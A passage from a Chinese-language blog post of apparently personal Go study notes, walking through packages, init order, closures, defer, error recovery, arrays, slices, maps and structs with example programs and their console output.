func add(num1 int, num float32, testFunc func(int)) {
    fmt.Println("----调用成功")
}
func main() {
    add(1, 2.0, test)
    type myint int //myint = int
    var num23 myint = 18
    fmt.Printf("数据类型是 %t", num23)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
----调用成功
数据类型是 %!t(main.myint=18)
```

但是这里注意一下

```
type myint int //myint = int
    var num23 myint = 18
    fmt.Printf("数据类型是 %t", num23)
​
    var num2 int = 30
    num2 = num23
    不能通过这
```

如果实在需要 我们将 num23 转变为int

```
package main
​
import (
    "fmt"
)
​
func test(num int) { //这里是一个数据类型
    fmt.Println(num)
}
​
func add(num1 int, num float32, testFunc func(int)) {
    fmt.Println("----调用成功")
}
func main() {
    add(1, 2.0, test)
    type myint int //myint = int
    var num23 myint = 18
    fmt.Printf("数据类型是 %t\n", num23)
​
    var num2 int = 30
    num2 = int(num23)
    fmt.Println(num2)
​
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
----调用成功
数据类型是 %!t(main.myint=18)
18
```

### 可以给函数起别名

```
package main
​
import (
    "fmt"
)
​
func test(num int) { //这里是一个数据类型
    fmt.Println(num)
}
​
type myFunc func(int)   // 起别名
​
func add(num1 int, num float32, testFunc func(int)) {
    fmt.Println("----调用成功")
}
func main() {
    add(1, 0.2, test)
}
​
```

### 支持给返回值命名

```
package main
​
import "fmt"
​
func test(num int) (sum int) { //这里指定了返回值进行命名
    sum = num
    return
}
​
func main() {
    result := test(1)
    fmt.Println(result)
}
​
```

## 包

```
我们不可能将所有的函数放在一个源文件里
```

main.go

```
package main //1. package 是包的声明
import (
    "fmt"
    "learn/add"
)
​
func main() {
    fmt.Println("这里是main函数的执行")
    add.AddNum()
}
​
```

add.go

```
package add
​
import "fmt"
​
func AddNum() { //首字母需要大写 让其他包访问
    fmt.Println("执行了 add包的addNum函数")
}
​
```

这里需要注意的是

```
需要在go的src根目录下 才可以实现导包
​
```

这里的层级关系为



<img src="https://i-blog.csdnimg.cn/blog_migrate/b01a4a73cbb0f315221e57bb7d63bf72.png" alt="" style="max-height:78px; box-sizing:content-box;" />


可以发现 两个目录 其实就是 两个包

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\tempCodeRunnerFile.go"
这里是main函数的执行
执行了 add包的addNum函数
```

### 包的细节

1、包的声明最好和文件夹一直 并且vscode可以直接通过文件夹提示词填充



<img src="https://i-blog.csdnimg.cn/blog_migrate/f0316d542fe2d82456383dcd3c3af5e6.png" alt="" style="max-height:96px; box-sizing:content-box;" />


2、 main函数必须要放在main包下 所以否则会编译报错

3、 打包的语法

```
package 包名
```

4、 引入包的语法

```
import "路径" // 从 gopath （环境变量）的 src 下开始找
```

5、调用其他函数的时候 必须要加上包名 并且在包中的 Public 需要大写首字母

```
func Add(){
// 这个函数 是可以被其他包所引用的
}
func addNum(){
//这个函数 是私有的 只可以通过本包使用
}
在main中调用包的方式
test.Add()    test包中调用add函数
```

6、 一个包下不能有重复的函数

7、 虽然建议包名和目录一样 但是也可以不需要

8、 一个目录下的同级文件都属于一个包（文件夹） 意思就是一个包(文件夹)下 package声明 都需要一样的 不能不一样

9、 可以对包继续起别名

```
import (
    test "包的路径(aaa)"
)
下面的调用
test.Add()
但是这里不能使用原先的包名
aaa.Add() //报错
```

### 包的解释

```
从程序来看 申明为 package 为同一个包名的代码块 就是一个包
​
从源文件来看 一个文件夹就是一个包（推荐通过文件夹命名）
```



## init函数

```
对内容进行初始化的操作 每个源文件都可以包含一个 init函数
在main函数之前被调用
```

```
package main
​
import "fmt"
​
func main() {
    fmt.Println("main函数被执行")
}
​
func init() {
    fmt.Println("init被执行")
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
init被执行
main函数被执行
```

看到 init实现被go框架进行调用

### 存在全局变量 init函数 和main函数的执行流程

```
package main
​
import "fmt"
​
var num int = test()
​
func test() int {
    fmt.Println("test函数被执行")
    return 10
}
​
func main() {
    fmt.Println("main函数被执行")
}
​
func init() {
    fmt.Println("init被执行")
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
test函数被执行
init被执行    
main函数被执行
```

可以发现 全局变量 > init > main

### 多个源文件都有init函数的执行流程

main.go

```
package main
​
import (
    "fmt"
    "learn/add"
)
​
var num int = test()
​
func test() int {
    fmt.Println("test函数被执行")
    return 10
}
​
func main() {
    fmt.Println("main函数被执行")
    fmt.Println("name: ", addd.Name, "age:", addd.Age)
}
​
func init() {
    fmt.Println("init被执行")
}
​
```

add.go

```
package addd
​
import "fmt"
​
var (
    Age  int
    Name string
)
​
func init() {
    fmt.Println("adDd的init被执行了")
    Age = 18
    Name = "fuck"
}
​
```

```
adDd的init被执行了   //package addd的init被执行
test函数被执行      // 全局变量
init被执行         //main中的init
main函数被执行      //main函数
name:  fuck age: 18//虽然导入内容为init  但是执行的函数是main
```



## 匿名函数

```
希望一个函数只被使用一次 那么就使用匿名函数
​
1 定义匿名函数的 是直接调用 这种方式的匿名函数只能使用一次
2 将匿名函数赋值给一个变量（该变量现在就是函数变量了） 然后再通过该变量调用匿名函数   （需要多次使用）
```

```
package main
​
import "fmt"
​
func main() {
    //定义匿名函数
    res := func(num1 int, num2 int) int {
        return num1 + num2
    }(10, 20)  // 这里可以发现 我们创建完直接调用
    fmt.Println(res)
}
​
```

```
package main
​
import "fmt"
​
func main() {
    //定义匿名函数
    res := func(num1 int, num2 int) int {
        return num1 + num2
    }
    a := res(1, 2)   //可以发现是通过res 接受到了函数变量 
    fmt.Println(a)
}
​
```

```
package main
​
import "fmt"
//这里是全局变量的匿名函数
var res = func(num1 int, num2 int) int {
    return num1 + num2
}
​
func main() {
    //定义匿名函数
    a := res(1, 2)
    fmt.Println(a)
}
​
```

## 闭包

```
函数和引用环境组成的一个整体
```

```
package main
​
import "fmt"
​
//函数名为 getSum 参数为空
// 返回值为一个函数 这个函数的参数类型是一个int 并且它的返回值为int
func getSum() func(int) int {
    var n int = 18
    return func(num int) int {
        n = n + num
        return n
    }
}
//闭包就是上面的匿名函数+n 
func main() {
    res := getSum()
​
    fmt.Println(res(1))
    fmt.Println(res(2)) //不是20 而是 21 说明 上面定义的函数 中的 n 被修改了 但是当被注释掉了 上面的1 时 就可以发现是20
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
19
21
```



```
总结一下 匿名函数 + 引用的变量和参数 == 闭包  // 依旧是匿名函数
​
返回的是匿名函数
闭包的参数会一直保存在内存中（一次运行的时候）----不可滥用 对内存消耗大
​
什么时候需要 就是需要参数一直保存在内存中的时候 就需要使用闭包
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/157d36b5d4e0794107b5bbbf758c1c37.png" alt="" style="max-height:212px; box-sizing:content-box;" />


这里的话就是每次都需要传递参数进入（没有使用闭包）

## defer关键字

```
函数执行完 defer释放关键字
```



```
package main
​
import "fmt"
​
func add(num1 int, num2 int) int {
    defer fmt.Println("num1", num1)
    defer fmt.Println("num2", num2)
    var sum int = num1 + num2
    fmt.Println("sum:", sum)
    return sum
}
​
func main() {
    fmt.Println(add(1, 2))
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
sum: 3
num2 2
num1 1
3
```

可以发现 defer是将内容存入栈中 先进后出 所以我们可以发现 首先输出了 sum --- > num2 ----> num1---->函数结束 到main

```
遇到defer关键字 不会立即执行defer后的语句 将defer后的语句 压入栈内 （后进先出）
继续执行下面的内容
```

### defer的应用场景

```
关闭使用的资源 随手defer defer 存在延迟执行 （函数执行完毕再执行defer）
```

## 系统函数

```
len 统计字符串的长度
​
​
```



#### 字符串的遍历

```
r :=[]rune(str)
```



```
package main
​
import "fmt"
​
func main() {
    str := "golang你好"
    for i, value := range str {
        fmt.Printf("索引为 %d,具体为 %c\n", i, value)
    }
    //利用切片
    fmt.Println("-----------------------------------------------------")
    r := []rune(str)
    for i := 0; i < len(r); i++ {
        fmt.Printf("内容为 %c\n", r[i])
    }
}
​
```



#### 类型转换

```
n,err := strconv.Atoi()
​
s := strconv.Itoa()
```



```
package main
​
import (
    "fmt"
    "strconv"
)
​
func main() {
    num1, err := strconv.Atoi("666")
    fmt.Printf("类型是： %t, %t\n", num1, err)
​
    num2 := strconv.Itoa(666)
    fmt.Printf("类型是： %t\n", num2)
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
类型是： %!t(int=666), %!t(<nil>)
类型是： %!t(string=666)
```

#### 查找子串 是否在指定的 字符串中

```
strings.Contains()
```



```
package main
​
import (
    "fmt"
    "strings"
)
​
func main() {
    a := strings.Contains("nonono", "on")
    fmt.Println(a)
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
true
```

#### 统计一个字符串中存在多少子串

```
strings.Count()
```

```
package main
​
import (
    "fmt"
    "strings"
)
​
func main() {
    a := strings.Count("nonono", "no")
    fmt.Println(a)
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
3
```



#### 不区分大小写的比较

```
string.EqualFold()
```



```
package main
​
import (
    "fmt"
    "strings"
)
​
func main() {
    a := strings.EqualFold("heloo", "HELOo")
    fmt.Println(a)
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
true
```

#### 区分大小写的字符串比较



```
package main
​
import (
    "fmt"
)
​
func main() {
    fmt.Println("hello" == "hEllo")
}
​
```

#### 返回字符串第一次出现的索引值

```
strings.Index()
如果不存在是 返回 -1
```



```
package main
​
import (
    "fmt"
    "strings"
)
​
func main() {
    a := strings.Index("abcdefg", "f")
    fmt.Println(a)
}
​
```

```
PS D:\GO\src\learn> go run "d:\GO\src\learn\main\main.go"
5
```



#### 字符串的替换

```
strings.Replace("字符串","需要替换的字符串","替换为的值",n) // n为几个 -1 就是全部 其他就是个数
```

#### 将字符串按照某个字符进行切割

```
arr := strings.Split("a-b-c-d",'-') //最后会变为一个数组
```

#### 字符串大小写的切换

```
strings.ToLower("字符串")  //小写
strings.ToUpper("字符串")  //大写
```

#### 将字符串左右两个空格去掉

```
strings.TrimSpace("        字符串       ")
```

#### 将字符串左右两边指定的字符去掉 （或者指定左右）

```
strings.Trim("~~~字符串~~~","~")
strings.TrimLeft("~~~字符串~~~","~")
strings.TrimRight("~~~字符串~~~","~")
```

#### 判断是否以指定字符串开头/结尾

```
strings.HasPrefix("https://baidu.com","https")
strings.HasSuffix("https://baidu.com","com")
```



### 日期时间函数

```
package main
​
import (
    "fmt"
    "time"
)
​
func main() {
    a := time.Now()
    fmt.Println(a)
    fmt.Printf("%T\n", a)
    fmt.Printf("年:%v\n", a.Year())
    b := fmt.Sprintf("年:%v", a.Year())
    fmt.Println(b)  //通过 Sprintf 可以将字符串存储到变量中
}
​
```

```
2023-12-05 09:07:37.7813106 +0800 CST m=+0.001547901
time.Time  //结构体
年:2023
```

指定格式

```
package main
​
import (
    "fmt"
    "time"
)
​
func main() {
    a := time.Now()
    fmt.Println(a)
    fmt.Printf("%T\n", a)
    fmt.Printf("年:%v\n", a.Year())
    b := fmt.Sprintf("年:%v", a.Year())
    fmt.Println(b)
    fmt.Println("---------------------------------------")
    cbd := a.Format("2006/01/02 15/04/04")
    //按照这种格式来写 这里内容需要固定 01 02
    fmt.Println(cbd)
    zbcd := a.Format("2006 15/04")  //可以发现任意组合即可
    fmt.Println(zbcd)
}
​
```

```
---------------------------------------
2023/12/05 09/18/18
2023 09/18
```



这里的时间是必须要为 2006/01/02 15/04/05

### 内置函数

```
len
new ： 用来分配内存的 以第一个实参的类型 而不是值 返回值是指向该类型新分配的指针
​
```

```
package main
​
import "fmt"
​
func main() {
    num := new(int)
    fmt.Printf("%T\n%v\n%v", num, &num, *num)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
*int          发现是一个指针
0xc00005e020
0
```

分配内存的其他函数

```
make
```





## 错误处理机制

正常的报错

```
package main
​
import "fmt"
​
func main() {
    test()
}
func test() {
    num1 := 10
    num := 0
    result := num1 / num
    fmt.Println(result)
}
​
```

```
panic: runtime error: integer divide by zero
​
goroutine 1 [running]:
main.test()
        D:/GO/src/learn/main/main.go:11 +0x9
main.main()
        D:/GO/src/learn/main/main.go:6 +0xf 
exit status 2
```

发现这里是报错 状态2

错误捕获机制

格式

```
defer recover 
recover:允许程序 管理错误
再defer 中 执行 recover 捕获错误， 如果再defer外 就不会停止程序
```

```
package main
​
import (
    "fmt"
)
​
func main() {
    test()
    fmt.Println("但是被捕获后 代码还会继续执行")
}
​
func test() {
    //defer + recover + 匿名函数的调用
    defer func() {
        //调用recover 捕获错误
        err := recover()
        if err != nil {
            fmt.Println("捕获错误了")
            fmt.Println("错误为：", err)
        }
    }()
    num1 := 10
    num2 := 0
    res := num1 / num2
    fmt.Println(res)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\tempCodeRunnerFile.go"
捕获错误了
错误为： runtime error: integer divide by zero
但是被捕获后 代码还会继续执行
```

### 自定义错误

```
通过 err := errors.New("字符串")
输出为 "字符串"
```



```
package main
​
import (
    "errors"
    "fmt"
)
​
func main() {
    err := test()
    if err != nil {
        fmt.Println("自定义错误：", err)
    }
    fmt.Println("但是被捕获后 代码还会继续执行")
​
}
​
func test() (err error) {
    num1 := 10
    num2 := 0
    if num2 == 0 {
        //抛出自定义错误
        return errors.New("除数不能为0！！")
    } else {
        res := num1 / num2
        fmt.Println(res)
        //正确就返回0值
        return nil
    }
​
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
自定义错误： 除数不能为0！！
但是被捕获后 代码还会继续执行
```

这里如果我们想报错后直接停止 我们可以使用 panic 函数实现

```
if err != nil {
        fmt.Println("自定义错误：", err)
        panic(err)
    }
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
自定义错误： 除数不能为0！！
panic: 除数不能为0！！
​
goroutine 1 [running]:
main.main()
        c:/Users/Administrator/Desktop/go/src/learn/main/main.go:12 +0xdd
exit status 2
```

## 数组

```
package main
​
import "fmt"
​
func main() {
    //给出学生的成绩 总和和平均数
    var scores [5]int
    scores[1] = 95
    scores[2] = 91
    scores[3] = 39
    scores[4] = 60
    scores[0] = 21
    res := 0
    for i := 0; i < len(scores); i++ {
        res += scores[i]
    }
    fmt.Println(res)
    avg := res / len(scores)
    fmt.Println(avg)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
306
61
```

定义数组的格式

```
var 数组名字 [大小]类型
var num [6]int
```

### 数组的内存分析

```
package main
​
import "fmt"
​
func main() {
    var arr [3]int16
    fmt.Println(len(arr))
    fmt.Println(arr)
    fmt.Printf("%p\n", &arr) //打印地址出来
    fmt.Printf("%p\n", &arr[0])
    fmt.Printf("%p\n", &arr[1])
    fmt.Printf("%p\n", &arr[2])
​
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
3
[0 0 0]
0xc00000a0b8
0xc00000a0b8
0xc00000a0ba
0xc00000a0bc
// 能发现 数组开始是从 [0] 开始 并且是一块连续的空间   int16占2字节 所以占多大只是根据类型进行判断
```

```
package main
​
import "fmt"
​
func main() {
    var arr [3]int16
    fmt.Println(len(arr))
    fmt.Println(arr)
    fmt.Printf("%p\n", &arr) //打印地址出来
    fmt.Printf("%p\n", &arr[0])
    fmt.Printf("%p\n", &arr[1])
    fmt.Printf("%p\n", &arr[2])
    arr[0] = 10
    arr[1] = 20
    arr[2] = 30
    fmt.Println("---------------------------")
    fmt.Printf("%p\n", &arr) //打印地址出来
    fmt.Printf("%p\n", &arr[0])
    fmt.Printf("%p\n", &arr[1])
    fmt.Printf("%p\n", &arr[2])
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
3
[0 0 0]
0xc00000a0b8
0xc00000a0b8
0xc00000a0ba
0xc00000a0bc
---------------------------
0xc00000a0b8
0xc00000a0b8
0xc00000a0ba
0xc00000a0bc
```

能发现 地址没有修改 只是修改了 地址中的值而已

<img src="https://i-blog.csdnimg.cn/blog_migrate/081b534a1d7f5171d28442bd32a79583.png" alt="" style="max-height:334px; box-sizing:content-box;" />


### 数组的遍历

```
package main
​
import (
    "fmt"
)
​
func main() {
    //给出学生的成绩 总和和平均数
    var scores [5]int
    // scores[1] = 95
    // scores[2] = 91
    // scores[3] = 39
    // scores[4] = 60
    // scores[0] = 21
    for i := 0; i < len(scores); i++ {
        fmt.Printf("请录入第%d个学生成绩:", i+1)
        fmt.Println()
        fmt.Scanln(&scores[i])
    }
    //遍历输出
    //1 for 循环
    for i := 0; i < len(scores); i++ {
        fmt.Printf("第%d个成绩为：%d\n", i+1, scores[i])
    }
    fmt.Println("--------------------------------------")
    //2 for range 循环
    for key, value := range scores {
        fmt.Printf("第%d个成绩为：%d\n", key+1, value)
    }
    fmt.Println("--------------------------------------")
    //2 for range 循环
    for _, value := range scores {
        fmt.Printf("成绩为：%d\n", value)
    }
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
请录入第1个学生成绩:
99
请录入第2个学生成绩:
98
请录入第3个学生成绩:
77
请录入第4个学生成绩:
5
请录入第5个学生成绩:
4
第1个成绩为：99
第2个成绩为：98
第3个成绩为：77
第4个成绩为：5
第5个成绩为：4
--------------------------------------
第1个成绩为：99
第2个成绩为：98
第3个成绩为：77
第4个成绩为：5
第5个成绩为：4
--------------------------------------
成绩为：99
成绩为：98
成绩为：77
成绩为：5
成绩为：4
```

可以发现 使用

```
for key,value := range 数组 {   //这里的话 key就接受到了下标值 value是下标对应的值
​
}
如果选择不接受的话 使用 _ 来忽略
```

### 数组的初始化

```
package main
​
import "fmt"
​
func main() {
    //1
    var arr1 [3]int = [3]int{1, 2, 3}
    fmt.Println(arr1)
    //2
    var arr2 = [3]int{2, 3, 4}
    fmt.Println(arr2)
    //3
    var arr3 = [...]int{1, 2, 3, 4, 5}
    fmt.Println(arr3)
    //4
    var arr4 = [...]int{2: 66, 6: 55}
    fmt.Println(arr4)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[1 2 3]
[2 3 4]
[1 2 3 4 5]      
[0 0 66 0 0 0 55]
```

四种初始化的方式

### 数组的注意事项

【1】长度属于类型的一部分 ：

<img src="https://i-blog.csdnimg.cn/blog_migrate/ed45175d2c7f18ae3fb5f5cfd661aa8c.png" alt="" style="max-height:467px; box-sizing:content-box;" />


【2】Go中数组属值类型，在默认情况下是值传递，因此会进行值拷贝。

<img src="https://i-blog.csdnimg.cn/blog_migrate/853d7c989bb30c533ab57ce212b26f7e.png" alt="" style="max-height:375px; box-sizing:content-box;" />


【3】如想在其它函数中，去修改原来的数组，可以使用引用传递(指针方式)。

<img src="https://i-blog.csdnimg.cn/blog_migrate/69d3e133b83ee7050c02fd6742ff30d9.png" alt="" style="max-height:400px; box-sizing:content-box;" />


### 多维数组

```
package main
​
import "fmt"
​
func main() {
    var arr [2][3]int16
    fmt.Println(arr)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[[0 0 0] [0 0 0]]  //套娃 数组里 又是数组
```

### 二维数组的遍历

```
package main
​
import (
    "fmt"
)
​
func main() {
​
    var arr [3][3]int = [3][3]int{{1, 2, 3}, {4, 5, 6}, {7, 8, 9}}
    // fmt.Println(arr)
    //1
    for i := 0; i < len(arr); i++ {
        for k := 0; k < len(arr); k++ {
            fmt.Printf("arr[%d][%d]的值为%d\t", i, k, arr[i][k])
        }
        fmt.Println()
    }
    //2
    fmt.Println("---------------------------------------------")
    for key, value := range arr {
        for k, v := range value {
            fmt.Printf("arr[%d][%d]的值为%d\t", key, k, v)
        }
        fmt.Println()
    }
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
arr[0][0]的值为1        arr[0][1]的值为2        arr[0][2]的值为3
arr[1][0]的值为4        arr[1][1]的值为5        arr[1][2]的值为6
arr[2][0]的值为7        arr[2][1]的值为8        arr[2][2]的值为9
---------------------------------------------
arr[0][0]的值为1        arr[0][1]的值为2        arr[0][2]的值为3
arr[1][0]的值为4        arr[1][1]的值为5        arr[1][2]的值为6
arr[2][0]的值为7        arr[2][1]的值为8        arr[2][2]的值为9
```

## 切片

slice 是go中特定的类型

```
数组--> 长度不可变 给了就是多少
数组比较少用 切片较多
切片是对数组一个连续片段的引用 是一个引用类型
```



可以是整个数组 也可以是一个片段

```
package main
​
import "fmt"
​
func main() {
    var intarr [6]int = [6]int{1, 2, 3, 4, 5, 6}
    fmt.Println(intarr)
    //切片的定义 ：是一个动态变换的数组 所以长度不写
    //[1:3] 大于等于1 小于3 （取不到3）
    var slice []int = intarr[1:3]
    fmt.Println(slice)
    //获取切片的容量
    fmt.Println(cap(slice))
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[1 2 3 4 5 6]
[2 3]
5
```

所以本质上还是一个数组

### 切片的内存分析

按照上面的来



<img src="https://i-blog.csdnimg.cn/blog_migrate/6390514d78cb83cbe6edc43d227482f2.png" alt="" style="max-height:425px; box-sizing:content-box;" />


所以这里我们对切片进行修改 数组的值也会修改 因为我们获取到的是数组的地址

引用数据类型

### 切片的定义

1

```
让切片去引用一个定义好的数组
var arr [3]int = [3]int{1,2,3}
qiepian := arr[1:2]
```

2

```
通过make内置函数进行创建
var 切片名[type = make([],len,[cap])]
```

```
package main
​
import "fmt"
​
func main() {
    qiepain := make([]int, 4, 20)
    fmt.Println(qiepain)
    qiepain[0] = 666
    qiepain[1] = 888
    fmt.Println(qiepain)
}
​
```

这里可以发现 是数组

```
make 是对底层创建一个数组 对外不可见 要通过 切片间接操作 不可以直接对数组进行操作
```

3

```
定义一个切片 指定具体的数组 对外不可操作 类似make
```

```
package main
​
import "fmt"
​
func main() {
    qiepian := []int{1, 2, 3}
    fmt.Println(qiepian)
}
​
```

### 切片的遍历

和普通数组差不多

```
package main
​
import "fmt"
​
func main() {
​
    slice := []int{1, 2, 3}
    //普通for循环
    for i := 0; i < len(slice); i++ {
        fmt.Println(slice[i])
    }
    fmt.Println("-----------------------------------")
    //for range 循环
    for key, value := range slice {
        fmt.Printf("第%d位的值为：%d\n", key+1, value)
    }
}
​
```

## 切片的注意事项

#### 切片被定义不可直接使用 需要引用到一个数组 或者通过make 创建 空的数组

```
package main
​
import "fmt"
​
func main() {
    var slice []int
    fmt.Println(slice)
}
​
```

```
[]
```

#### 切片被使用的时候不能越界

```
package main
​
import "fmt"
​
func main() {
    var arr [6]int = [6]int{1, 2, 3, 4, 5, 6}
    var slice []int = arr[1:4]
    fmt.Println(slice)
    // fmt.Println(slice[3])  这里越界了 超出切片的范围了
}
​
```



#### 切片的简写

```
var slice = arr[0:end] ------> var slice = arr[:end]
var slice = arr[start:len(arr)] ------> var slice = arr[start:]
var slice = arr[0:len(arr)] -------> var slcie = arr[:]
```

#### 切片可以连续切片

```
package main
​
import "fmt"
​
func main() {
    var arr [6]int = [6]int{1, 2, 3, 4, 5, 6}
    var slice []int = arr[1:4]
    fmt.Println(slice)
    // fmt.Println(slice[3])  这里越界了 超出切片的范围了
    slice2 := slice[1:2]
    fmt.Println(slice2)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[2 3 4]
[3]
```

发现在切的时候 继续切

#### 切片可以动态增长

```
package main
​
import "fmt"
​
func main() {
    var arr [6]int = [6]int{1, 2, 3, 4, 5, 6}
    var slice []int = arr[1:4]
    fmt.Println(slice)
    // fmt.Println(slice[3])  这里越界了 超出切片的范围了
    slice2 = append(slice, 123)
    fmt.Print(slice2)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[2 3 4]
[2 3 4 123]
```

发现通过 append 实现了动态增长 其实这里的数组 slice 被拷贝到 slice2 并且加入 123了

但是一般使用的时候 不会通过新的 所以直接应该赋值给 slice

```
底层的新数组 slice 不能直接维护 还是需要通过切片间接维护操作
```

这里还可以追加 切片

```
package main
​
import "fmt"
​
func main() {
    var arr [6]int = [6]int{1, 2, 3, 4, 5, 6}
    var slice []int = arr[1:4]
    fmt.Println(slice)
    // fmt.Println(slice[3])  这里越界了 超出切片的范围了
    slice = append(slice, 123)
    fmt.Println(slice)
    slice3 := []int{1, 2, 3}
    slice = append(slice, slice3...)
    fmt.Println(slice)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[2 3 4]
[2 3 4 123]
[2 3 4 123 1 2 3]
```

发现是追加了切片内容

#### 切片的拷贝（复制）

```
package main
​
import "fmt"
​
func main() {
    var slice []int = []int{1, 2, 3, 4}
    var slice2 []int = make([]int, 10)
    //拷贝
    copy(slice2, slice)   //slice ----> 复制给 ------> slice2
    fmt.Println(slice2)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[1 2 3 4 0 0 0 0 0 0]
```

## 映射 MAP

将键值对 进行关联

```
其实就是一对匹配的信息
学生学号-学生姓名
2021 - xxx
键 key - 值 value
```

基本的语法

```
var 变量名 map[key]value
key 一般为 string int
value 一般 int string map  结构体
```

map是无序的 无法保证顺序

key重复就会按照最后一个存储的内容

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
    fmt.Println(a)
}
​
```

最经常使用的存储数据的方式

对map的操作

### 增

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
​
    fmt.Println(a)
    fmt.Println("-------------------------")
    a[1231234] = "不是张三"
    fmt.Println(a)
}
​
```

```
map[123123:张三]
-------------------------        
map[123123:张三 1231234:不是张三]
```



### 改

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
​
    fmt.Println(a)
    fmt.Println("-------------------------")
    a[123123] = "不是张三"
    fmt.Println(a)
}
​
```

```
map[123123:张三]
-------------------------
map[123123:不是张三]
```

### 删

使用 delete(map,'key')

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
​
    fmt.Println(a)
    fmt.Println("-------------------------")
    a[1231234] = "不是张三"
    fmt.Println(a)
    fmt.Println("-------------------------")
    delete(a, 1231234)
    fmt.Println(a)
}
​
```

```
map[123123:张三]
-------------------------
map[123123:张三 1231234:不是张三]
-------------------------
map[123123:张三]
```

一次性清空 那么就进行遍历 / map 重新make一个集合

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
​
    fmt.Println(a)
    fmt.Println("-------------------------")
    a[1231234] = "不是张三"
    fmt.Println(a)
    fmt.Println("-------------------------")
    delete(a, 1231234)
    fmt.Println(a)
    a = make(map[int]string)
    a[1] = "新的map"
    fmt.Println("-------------------------")
    fmt.Println(a)
}
​
```

```
map[123123:张三]
-------------------------
map[123123:张三 1231234:不是张三]
-------------------------
map[123123:张三]
-------------------------
map[1:新的map]
```



### 查

```
value,bool=map[key]
```

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
    }
​
    value, flag := a[123123]
    fmt.Println(value, flag)
}
​
```

```
张三 true
```

遍历查看

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
        123311: "2222",
    }
​
    // value, flag := a[123123]
    // fmt.Println(value, flag)
    for key, value := range a {
        fmt.Printf("索引为%v对应的数为:%v\n", key, value)
    }
}
​
```

```
索引为123123对应的数为:张三
索引为123311对应的数为:2222
```

len查看

```
package main
​
import "fmt"
​
func main() {
    a := map[int]string{
        123123: "张三",
        123311: "2222",
    }
​
    // value, flag := a[123123]
    // fmt.Println(value, flag)
    fmt.Println(len(a))
}
​
```

```
2
```

对map的内容 map中的map

```
package main
​
import "fmt"
​
func main() {
    a := make(map[string]map[int]string)
    a["第一个"] = make(map[int]string)
    a["第一个"][1] = "nonono"
    a["第一个"][2] = "yesyesyes"
    for _, v := range a {
        fmt.Println(v)
        for _, v1 := range v {
            fmt.Println(v1)
        }
    }
}
​
```

```
map[1:nonono 2:yesyesyes]
nonono
yesyesyes
```

## 面向对象

### 结构体的引入

```
人 xxx : 姓名:111  age:18 性别:男
​
我们如果想表示这个人的对象的话
```

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
    sex  string
}
​
func main() {
    //人 xxx : 姓名:111  age:18 性别:男
​
    var n xxx
    fmt.Println(n)
    n.name = "123"
    n.age = 18
    n.sex = "男"
    fmt.Println("---------")
    fmt.Println(n)
}
​
```

```
{ 0 }
---------
{123 18 男}
```

### 结构体的内存分析



<img src="https://i-blog.csdnimg.cn/blog_migrate/c67074fce13b894cb405efc54b6e6175.png" alt="" style="max-height:460px; box-sizing:content-box;" />


```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
    sex  string
}
​
func main() {
    //人 xxx : 姓名:111  age:18 性别:男
​
    var n xxx = xxx{age: 18, name: "123", sex: "男"}
    fmt.Println(n)
}
​
```

```
{123 18 男}
```

创建的方式

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
    sex  string
}
​
func main() {
